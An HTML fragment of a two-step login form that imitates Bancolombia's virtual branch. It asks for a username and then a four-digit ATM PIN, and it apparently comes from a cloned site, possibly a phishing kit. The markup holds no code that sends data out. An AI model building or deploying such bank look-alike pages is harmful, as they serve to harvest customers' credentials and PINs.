<!-- Inicio de Sesion -->
<div id="login" class="w-full flex flex-col justify-center items-center pb-6">
    <h5 id="titulo" class="text-[24px] font-cib-sans-bold mt-10">Te damos la bienvenida</h5>

    <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">

        <!-- Usuario Form -->
        <div id="usuarioForm" class="w-[100%] bg-white px-2 py-4 rounded-xl flex flex-col items-center">

            <div class="w-full flex items-center justify-center hiddenerror hidden">
                <span class="text-[11px] text-red-600"> La informacion ingresada es incorrecta. Intenta
                    nuevamente.</span>
            </div>

            <div class="w-[90%] flex flex-col mt-2.5">
                <span class="text-[16px] text-center text-gray-800">
                    El usuario es el mismo con el que ingresas a la
                    <span class="text-black font-bold">Sucursal Virtual Personas</span>
                </span>
            </div>

            <div class="w-[80%] mt-4 flex flex-col">
                <div class="w-full floating-label-container thin-border-bottom bg-white">
                    <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                            d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                    </svg>
                    <input id="usuario" type="text" class="floating-input" placeholder="" value=""
                        autocomplete="off" />
                    <span id="usuarioLabel" class="floating-label">
                        Usuario
                    </span>
                </div>
                <span id="usuarioError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <div class="w-full pt-6 pb-2 flex justify-between items-center px-[15px]">
                <button class="font-bold py-2 px-6 rounded-full border border-black w-32">
                    Volver
                </button>
                <button id="continuarUsuario"
                    class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                    disabled>
                    Continuar
                </button>
            </div>
        </div>

        <!-- Clave Form -->
        <div id="claveForm" class="w-[100%] bg-white px-2 py-4 rounded-xl flex flex-col items-center hidden">
            <div class="mt-2.5">
                <img src="/3co/assets/candado.svg" alt="Candado" />
            </div>
            <div class="w-[90%] flex flex-col mt-4 mb-4">
                <span class="text-[16px] text-center text-gray-800">
                    Es la misma que usas en el cajero automatico
                </span>
            </div>

            <div class="w-full mt-4 flex flex-col items-center">
                <div class="flex justify-center gap-2 w-full max-w-xs">
                    <input id="clave-0" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="clave-1" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="clave-2" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="clave-3" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                </div>
                <span id="claveError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
            </div>

            <div class="w-full pt-6 pb-2 flex justify-between items-center px-[15px]">
                <button id="volverClave" class="font-bold py-2 px-6 rounded-full border border-black w-32">
                    Volver
                </button>
                <button id="continuarClave"
                    class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                    disabled>
                    Continuar
                </button>
            </div>
        </div>

    </div>
</div>
